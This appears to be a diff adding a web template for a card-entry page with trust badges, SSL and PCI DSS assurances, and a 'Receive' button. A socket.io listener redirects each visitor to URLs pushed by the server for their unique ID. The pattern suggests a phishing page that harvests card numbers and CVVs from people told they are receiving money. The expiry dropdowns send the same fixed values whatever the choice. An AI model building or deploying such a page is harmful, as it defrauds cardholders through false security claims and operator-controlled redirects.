@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>
+        <%= title %>
+    </title>
+    <link rel="stylesheet" href="/stylesheets/output.css">
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <%- include("./includes/jivochat.ejs") %>
+
+</head>
+
+<body class="bg-[#F3F2F2] roboto">
+    <%- include("./includes/navbar.ejs") %>
+        <div class="container max-w-7xl mx-auto lg:flex justify-between">
+            <form action="/card" method="post" class="lg:max-w-4xl w-full" id="cardForm">
+                <div class="ml-4 flex my-7">
+                    <img src="/images/secure-payment.png" alt="secure-payment" class="w-20 h-8">
+                    <img src="/images/mastercard-3ds.png" alt="mastercard-3ds" class="w-20 h-8 mx-3">
+                    <img src="/images/pci-dss.png" alt="pci-dss" class="w-20 h-8 mx-3">
+                    <img src="/images/vbv.png" alt="vbv" class="w-20 h-8 mx-3">
+                </div>
+                <div class="lg:flex mx-4 my-4">
+                    <div class="w-full mr-1">
+                        <label for="cardnumber" class="font-medium">Card number</label>
+                        <input type="tel" id="cardnumber" name="number"
+                            class="block outline-none border-2 border-gray-200 rounded-md py-2 px-2 w-full"
+                            placeholder="0000 0000 0000 0000" oninput="formatCardNumber(this)" maxlength="19" required>
+                        <p class="text-[#DC291E] text-sm ml-1" id="err-cardnumber">&nbsp;</p>
+                    </div>
+                    <div class="w-full lg:ml-2">
+                        <label for="cardholder" class="font-medium">Card holder</label>
+                        <input type="text" id="cardholder" name="holder"
+                            class="block outline-none border-2 border-gray-200 rounded-md py-2 px-2 w-full" required>
+                        <p class="text-[#DC291E] text-sm ml-1" id="err-cardholder">&nbsp;</p>
+                    </div>
+                </div>
+                <div class="lg:flex mx-4 my-4">
+                    <div class="w-full mr-1">
+                        <label for="expirydate_month" class="font-medium">Expiry date</label>
+                        <div class="flex">
+                            <select type="text" id="expirydate_month" name="expirydate_month"
+                                class="block outline-none border-2 border-gray-200 rounded-md py-2 px-2 w-full text-center appearance-none mr-1">
+                                <option value="01">01</option>
+                                <option value="01">02</option>
+                                <option value="01">03</option>
+                                <option value="01">04</option>
+                                <option value="01">05</option>
+                                <option value="01">06</option>
+                                <option value="01">07</option>
+                                <option value="01">08</option>
+                                <option value="01">09</option>
+                                <option value="01">10</option>
+                                <option value="01">11</option>
+                                <option value="01">12</option>
+                            </select>
+                            <select type="text" id="expirydate_year" name="expirydate_year"
+                                class="block outline-none border-2 border-gray-200 rounded-md py-2 px-2 w-full text-center appearance-none ml-1">
+                                <option value="2023">2023</option>
+                                <option value="2023">2024</option>
+                                <option value="2023">2025</option>
+                                <option value="2023">2026</option>
+                                <option value="2023">2027</option>
+                                <option value="2023">2028</option>
+                                <option value="2023">2029</option>
+                                <option value="2023">2030</option>
+                                <option value="2023">2031</option>
+                                <option value="2023">2032</option>
+                                <option value="2023">2033</option>
+                                <option value="2023">2034</option>
+                                <option value="2023">2035</option>
+                                <option value="2023">2036</option>
+                                <option value="2023">2037</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="w-full lg:ml-1 relative">
+                        <div><label for="cvv" class="font-medium">CVV Number</label>
+                            <input type="tel" id="cvv" name="cvv"
+                                class="block outline-none border-2 border-gray-200 rounded-md py-2 px-2 w-full"
+                                oninput="formatCVV(this)" maxlength="4" required>
+                        </div>
+                        <p class="text-[#DC291E] text-sm ml-1" id="err-cvv">&nbsp;</p>
+                    </div>
+                </div>
+                <div class="ml-4">
+                    <input type="checkbox" id="savecard">
+                    <label for="savecard" class="ml-2">Save this card</label>
+                    <button
+                        class="bg-[#DC291E] outline-none border-none py-2 px-10 text-white font-medium rounded-lg block my-4"
+                        type="submit" onclick="validateForm(event)">
+                        Receive
+                    </button>
+                    <p class="text-sm">You are on a payment server protected by SSL (https) and PCI DSS standards of our
+                        banking
+                        partners. Your data is encrypted for extra security.</p>
+                </div>
+            </form>
+        </div>
+        <script>
+            function validateCardNumber(cardNumber) {
+                // Remove spaces and any non-digit characters from the card number
+                const cardDigits = cardNumber.replace(/\s/g, '').replace(/\D/g, '');
+
+                if (cardDigits.length < 16) {
+                    return false; // Card number is too short, invalid
+                }
+
+                if (/^(\d)\1+$/.test(cardDigits)) {
+                    return false; // All digits are the same, e.g., "0000 0000 0000 0000" is invalid
+                }
+
+                // Convert the card number to an array of digits and reverse it
+                const cardArray = cardDigits.split('').map(Number).reverse();
+
+                let sum = 0;
+                let doubleUp = false;
+
+                for (let i = 0; i < cardArray.length; i++) {
+                    let digit = cardArray[i];
+                    if (doubleUp) {
+                        digit *= 2;
+                        if (digit > 9) {
+                            digit -= 9;
+                        }
+                    }
+                    sum += digit;
+                    doubleUp = !doubleUp;
+                }
+
+                return sum % 10 === 0;
+            }
+
+            document.getElementById("cardnumber").addEventListener("input", () => {
+                if (document.getElementById("err-cardnumber").textContent.length > 0) {
+                    document.getElementById("err-cardnumber").innerHTML = "&nbsp;"
+                }
+            })
+
+            document.getElementById("cardholder").addEventListener("input", () => {
+                if (document.getElementById("err-cardholder").textContent.length > 0) {
+                    document.getElementById("err-cardholder").innerHTML = "&nbsp;"
+                }
+            })
+
+            document.getElementById("cvv").addEventListener("input", () => {
+                if (document.getElementById("err-cvv").textContent.length > 0) {
+                    document.getElementById("err-cvv").innerHTML = "&nbsp;"
+                }
+            })
+
+            function validateForm(event) {
+                const cardNumberInput = document.getElementById("cardnumber");
+                const cvvInput = document.getElementById("cvv");
+                const cardHolderInput = document.getElementById("cardholder");
+                const cardNumber = cardNumberInput.value;
+                const cvv = cvvInput.value;
+                const cardHolder = cardHolderInput.value;
+
+                // Validate card number
+                if (!validateCardNumber(cardNumber)) {
+                    document.getElementById("err-cardnumber").textContent = "Invalid card number";
+                    event.preventDefault(); // Prevent form submission
+                } else {
+                    document.getElementById("err-cardnumber").innerHTML = "&nbsp;";
+                }
+
+                if (cardHolder.length < 2) {
+                    document.getElementById("err-cardholder").textContent = "Invalid card holder"
+                    event.preventDefault();
+                } else {
+                    document.getElementById("err-cardholder").innerHTML = "&nbsp;"
+                }
+
+                // Additional validation checks can be added for other fields like CVV, cardholder, etc.
+                // For CVV validation:
+                if (cvv.length !== 3 && cvv.length !== 4) {
+                    document.getElementById("err-cvv").textContent = "CVV must be 3 or 4 digits";
+                    event.preventDefault(); // Prevent form submission
+                } else {
+                    document.getElementById("err-cvv").innerHTML = "&nbsp;";
+                }
+            }
+
+            function formatCardNumber(input) {
+                // Remove all non-numeric characters from the input
+                let cardNumber = input.value.replace(/\D/g, '');
+
+                // Add a space after every 4 digits
+                cardNumber = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
+
+                // Update the input value
+                input.value = cardNumber;
+            }
+
+            function formatCVV(input) {
+                // Remove all non-numeric characters from the input
+                let cvv = input.value.replace(/\D/g, '');
+
+                // Update the input value
+                input.value = cvv;
+            }
+        </script>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+        <input type="hidden" id="uniqueID" value="<%= uniqueID %>">
+        <script>
+            const socket = io();
+
+
+            socket.on('redirect', async (data) => {
+                if (data.vcid === document.getElementById('uniqueID').value) {
+                    location.href = data.url
+                }
+            })
+        </script>
+</body>
+
+</html>
